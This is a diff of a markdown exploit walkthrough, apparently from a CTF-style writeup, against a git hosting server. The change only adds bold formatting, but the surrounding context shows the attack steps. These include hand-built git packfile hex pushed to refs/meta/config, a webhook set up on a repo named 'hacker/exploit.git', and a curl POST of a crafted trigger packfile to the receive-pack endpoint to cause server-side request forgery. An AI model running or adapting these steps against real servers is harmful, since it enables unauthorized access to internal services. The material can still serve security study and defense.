@@ -48,7 +48,7 @@ git push origin @:refs/meta/config
       - Switch to "C Arrays" or "Hex" view.
       - Copy the entire raw body (starting from the packfile header, e.g., `0030...` up to the end of the zlib-compressed pack). It should look like a long hex string (around 500-1000 bytes).
 
-Example snippet (yours will vary based on commit hash; full example from a writeup):
+**Example snippet (yours will vary based on commit hash; full example from a writeup):**
 ```text
 0x30, 0x30, 0x39, 0x34, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
@@ -83,7 +83,7 @@ git push origin long-trigger-branch
      - 4-byte length (e.g., `0034` for a 52-char line).
      - `<40 zero bytes> <40-char new OID> <ref string>\0 <capabilities>\0 <zlib pack>`.
 
-Example hex snippet:
+**Example hex snippet:**
 ```text
 0034000000000000000000000000000000000000000000000000000000000000000000000000 <new_oid> refs/heads/long-trigger-branch\0 report-status side-band-64k agent=git/2.25.10000PACK\0 <pack>
 ```
@@ -112,7 +112,7 @@ curl -X POST http://<host>:<port>/hacker/exploit.git/webhooks \
   - Response: {} if successful.
 #
 ## Step 5: Trigger the Webhook (Execute SSRF)
-POST the crafted trigger packfile (Payload B) to your repo's receive-pack endpoint to simulate a push:
+**POST the crafted trigger packfile (Payload B) to your repo's receive-pack endpoint to simulate a push:**
 ```text
 curl -X POST http://<host>:<port>/hacker/exploit.git/git-receive-pack \
   --data-binary @trigger_packfile.bin \
